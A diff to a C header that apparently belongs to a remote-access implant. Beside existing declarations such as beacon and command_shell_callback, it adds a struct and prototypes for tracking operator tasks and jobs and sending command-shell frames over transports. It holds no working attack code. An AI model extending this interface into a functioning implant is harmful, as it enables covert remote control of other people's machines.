@@ -24,6 +24,24 @@ void beacon(void * lpReserved);
 void process_payload(char * buffer, unsigned int length);
 void command_shell_callback(char * buffer, int length, int type);
 void post_crypt_replay_error(unsigned int diff);
+
+/* task tracking (proto.cpp). output_task tells whose frame is being sent:
+ * nobody's (0), a task's, or a job's (then with the job's id). Each
+ * transport sends its frames through command_shell_send;
+ * command_shell_callback (callback.cpp) tags them first. */
+typedef struct {
+	unsigned int task_no;
+	unsigned int job_id;
+	int          has_job;
+} task_out;
+int  output_task(task_out * out);
+unsigned int task_current_no(void);
+void task_job_claimed(void);
+void task_job_context(unsigned int task_no, unsigned int job_id);
+/* a lifecycle frame for a task; job_id < 0 when there is none */
+void task_notify(unsigned int type, unsigned int task_no, int job_id, const char * data, int length);
+void command_shell_send(char * buffer, int length, int type);
+void command_shell_post(char * buffer, int length, int type, BOOL sendNow);
 void process_payload(char * buffer, unsigned int length);
 
 /* prototype for our error function */
